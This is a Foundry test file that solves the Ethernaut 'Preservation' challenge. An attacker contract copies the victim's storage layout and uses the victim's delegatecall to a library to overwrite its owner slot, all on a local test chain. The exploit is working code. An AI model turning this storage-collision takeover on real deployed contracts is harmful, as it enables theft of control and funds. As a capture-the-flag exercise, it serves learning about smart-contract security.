// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Preservation, LibraryContract} from "../../src/16_Preservation/Preservation.sol";

pragma experimental ABIEncoderV2;


contract Attack is Test {


    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    Preservation public victim;
    LibraryContract public lib;
    address public hacker;

    function setUp() public {


        owner = vm.addr(1);
        hacker = vm.addr(2);

        vm.deal(hacker, 1 ether);

        vm.startPrank(owner);


        lib = new LibraryContract();
        victim = new Preservation(address(lib), address(lib));


        vm.stopPrank();

    }


    function testAttack() public {
        vm.startPrank(hacker);
        PreservationHack preservationHack = new PreservationHack(address(victim));
        preservationHack.attack();
        vm.stopPrank();
        //assertEq(victim.owner(), hacker);

        console.log(uint160(hacker));
        console.log(uint256(uint160(hacker)));
        console.log(address(uint160(uint256(uint160(hacker)))));

        assertEq(victim.owner(), address(0xbe961124A6DcAc9964614cDd0C34E339c80B8024));

    }

}

contract PreservationHack {
    // same storage layout as victim
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    Preservation public challenge;

    constructor(address _victim) {
        challenge = Preservation(_victim);
    }

    function setTime(uint256 time) public {
        // here time == address !
        // we jut have to cast it back from uint 256 <-> address
        // owner = address(uint160(time));
        owner = address(0xbe961124A6DcAc9964614cDd0C34E339c80B8024);
    }

    function attack() external {
        challenge.setFirstTime(uint256(uint160(address(this))));
        challenge.setFirstTime(uint256(uint160(msg.sender)));
    }
}

//https://github.com/Simon-Busch/Foundry-ethernaut-solutions/blob/main/test/Preservation.t.sol